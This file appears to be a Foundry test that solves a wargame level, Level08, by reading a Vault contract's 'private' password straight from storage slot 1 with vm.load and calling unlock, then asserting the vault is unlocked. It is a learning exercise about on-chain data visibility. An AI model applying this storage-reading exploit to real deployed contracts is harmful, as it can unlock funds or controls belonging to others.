// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {VmSafe} from "forge-std/Vm.sol";
import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/Level08.sol";

contract Level08Test is Test {
    Vault public target;
    VmSafe.Wallet attacker;

    function setUp() public {
        attacker = vm.createWallet("attacker");
        target = new Vault("secret");
    }

    function test_getContractOwnership() public {
        vm.startPrank(attacker.addr, attacker.addr);
        exploit(target);
        vm.stopPrank();

        assertFalse(target.locked());
    }

    function exploit(Vault _target) private {
        bytes32 password = vm.load(address(_target), bytes32(uint256(1)));
        _target.unlock(password);
    }
}
